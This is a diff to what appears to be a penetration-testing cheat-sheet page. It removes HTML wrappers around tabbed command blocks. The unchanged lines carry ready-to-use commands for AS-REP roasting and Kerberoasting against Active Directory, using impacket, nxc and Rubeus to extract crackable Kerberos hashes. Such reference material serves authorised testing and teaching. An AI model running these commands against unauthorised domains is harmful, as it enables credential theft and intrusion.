@@ -10,8 +10,6 @@ tags: ["as_rep roasting", "impacket", "active directory", "ad", "domain controll
 {{< tab set1 tab2 >}}nxc{{< /tab >}}
 {{< tabcontent set1 tab1 >}}
 
-<div>
-
 ```console
 # Multiple valid usernames
 impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC>
@@ -22,23 +20,15 @@ impacket-GetNPUsers <DOMAIN>/ -usersfile <USERS_FILE> -no-pass -dc-ip <DC>
 impacket-GetNPUsers -no-pass -dc-ip <TARGET> <DOMAIN>/<USER>
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set1 tab2 >}}
 
-<div>
-
 ```console
-# Multiple valid usernames (nxc)
+# Multiple valid usernames
 nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-<br>
 
 ---
 
@@ -48,36 +38,24 @@ nxc ldap <TARGET> -u <USERS_FILE> -p '' --asreproast as_rep_hashes.txt
 {{< tab set2 tab2 >}}nxc{{< /tab >}}
 {{< tabcontent set2 tab1 >}}
 
-<div>
-
 ```console
 # Fix time skew
 sudo ntpdate -s <DC> && impacket-GetUserSPNs -request '<DOMAIN>/<USER>:<PASSWORD>' -dc-ip <DC_IP>
 ```
 
-</div>
-
 <small>*Note: Times skew have to be within 5 minutes in kerberos*</small>
-
-<div>
 
 ```console
 # Kerberoasting without cred
 sudo ntpdate -s <DC> && impacket-GetUserSPNs -no-preauth <USER_WITH_DONT_REQUIRE_PREAUTH> -usersfile <USERS_FILE> -dc-host <DC_IP> <DOMAIN>/
 ```
 
-</div>
-
 {{< /tabcontent >}}
 {{< tabcontent set2 tab2 >}}
-
-<div>
 
 ```console
 nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast_hashes.txt
 ```
-
-</div>
 
 {{< /tabcontent >}}
 
@@ -86,15 +64,8 @@ nxc ldap <DC_IP> -u <USER> -p '<PASSWORD>' --kerberoasting kerberoast_hashes.txt
 {{< tab set3 tab1 active >}}rubeus{{< /tab >}}
 {{< tabcontent set3 tab1 >}}
 
-<div>
-
 ```console
 .\rubeus.exe kerberoast /creduser:<DOMAIN>\<USER> /credpassword:'<PASSWORD>'
 ```
 
-</div>
-
 {{< /tabcontent >}}
-
-
-<br>
